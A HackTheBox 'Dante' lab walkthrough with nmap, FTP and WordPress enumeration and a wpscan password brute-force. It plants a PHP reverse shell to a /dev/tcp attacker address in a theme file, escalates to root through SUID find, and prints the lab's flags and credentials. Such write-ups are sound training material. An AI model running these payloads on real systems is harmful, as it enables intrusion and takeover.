@@ -1,0 +1,106 @@
+# HTB Dante - Walkthrough (Simple Version)
+
+Machine: Dante  
+Difficulty: Easy/Medium  
+OS: Linux  
+Goal: Get user flag and root flag
+
+## 1. Reconnaissance (Information Gathering)
+
+- Scan the whole subnet to find live hosts  
+  Tool: **nmap**  
+  Command:  
+  ```bash
+  nmap -sn -T4 10.10.110.0/24 -oN active-hosts.txt
+Result: Two hosts alive → 10.10.110.2 (ignore - lab controller) and 10.10.110.100 (target)
+
+Full port scan + service version detection
+Tool: nmap
+Command:Bashnmap -T4 -sC -sV -p- --min-rate=1000 10.10.110.100 -oN full-scan.txtOpen ports:
+21 → FTP (Anonymous login allowed)
+22 → SSH
+65000 → HTTP (Apache server)
+
+
+2. FTP Enumeration
+
+Login with anonymous / anonymous
+Tool: ftp
+Command:Bashftp 10.10.110.100
+Name: anonymous
+Password: anonymous
+Found folder: Transfer/Incoming
+Download file: todo.txt
+Content:
+Mentions WordPress site
+LFI vulnerability in another site (not used here)
+User james has weak password (important hint)
+
+
+3. Web Enumeration (Port 65000)
+
+Check robots.txt
+URL: http://10.10.110.100:65000/robots.txt
+Found first flag:
+DANTE{You_Cant_G3t_@_M3_Br0!}
+robots.txt also disallows /wordpress → WordPress site exists
+Browse: http://10.10.110.100:65000/wordpress
+→ WordPress site confirmed
+
+4. WordPress Enumeration & Attack
+
+Scan WordPress
+Tool: wpscan
+Commands:Bashwpscan --url http://10.10.110.100:65000/wordpress --enumerate vp   # vulnerable plugins
+wpscan --url http://10.10.110.100:65000/wordpress --enumerate u   # usersResult:
+WordPress version 5.4.1 (old)
+Users: admin, james
+
+Find more usernames from "Meet The Team" page
+Names: james, kevin, kalthazar, aj, nathan
+Create custom wordlist from "Languages and Frameworks" page
+Tool: CeWLBashcewl http://10.10.110.100:65000/wordpress/index.php/languages-and-frameworks -w words.txt
+Brute force login
+Tool: wpscanBashwpscan --url http://10.10.110.100:65000/wordpress --usernames names.txt --passwords words.txtSuccess: james : Toyota
+Login to wp-admin with james/Toyota
+→ james is Administrator
+
+5. Get Reverse Shell (Initial Access)
+
+Go to Appearance → Theme Editor → Twenty Nineteen theme
+Edit 404.php file
+Add PHP reverse shell code:PHP<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/1234 0>&1'");
+?>(Change IP & port to your attacker machine)
+Start listener on your machine:Bashnc -lvnp 1234
+Open bad page in browser:
+http://10.10.110.100:65000/wordpress/wp-content/themes/twentynineteen/404.php
+Get shell as www-data
+
+6. User Flag
+
+Check /home → users: james, balthazar
+Try su to james with WordPress password: Toyota
+→ Works! (password reuse)
+Upgrade shell:Bashpython3 -c 'import pty; pty.spawn("/bin/bash")'
+Read flag:Bashcat /home/james/flag.txt
+DANTE{J4m3s_N33d5_@_p455w0rd_M4n4ger!}
+
+7. Privilege Escalation to Root
+
+Check bash history:Bashcat ~/.bash_historyFound MySQL creds for balthazar: TheJoker12345! (not used here)
+Find SUID binaries:Bashfind / -perm -4000 2>/dev/null→ /usr/bin/find has SUID
+Exploit using GTFOBins method:Bashfind . -exec /bin/bash -p \; -quit→ Get root shell (euid=0)
+Read root flag:Bashcat /root/flag.txt
+DANTE{t0_Much_Priv!}
+
+Tools Used
+
+nmap → Scanning
+ftp → Anonymous file access
+wpscan → WordPress enumeration & brute force
+CeWL → Custom wordlist
+nc → Listener
+find (SUID) → Root privilege escalation
+
+Done! Root access achieved.
